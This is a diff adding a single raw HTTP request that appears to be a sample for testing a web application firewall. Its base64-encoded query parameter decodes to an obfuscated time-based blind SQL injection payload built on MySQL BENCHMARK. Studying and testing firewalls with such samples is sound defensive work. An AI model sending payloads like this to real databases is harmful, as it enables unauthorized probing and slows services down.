@@ -1,0 +1,13 @@
+PUT /stroke/region/embrace/single%20quotation%20mark/symmetric?significant=MSkKIyBlZGl0IApvcg1CZW5DaG1BUksoMTAwMDAwMDAsbUQ1KDEpKSM%3D HTTP/1.1
+Host: waf-ce.chaitin.cn
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36
+Cookie: rapid=inter; permissive=anomaly; agnostic=simultaneously; SESSIONID=1586d2298f1cac1e603de84d7512112b7bee5465f7048ab0d50b5a0c5d07d08bdf94a591f361116a0c0f1ea43910d472
+
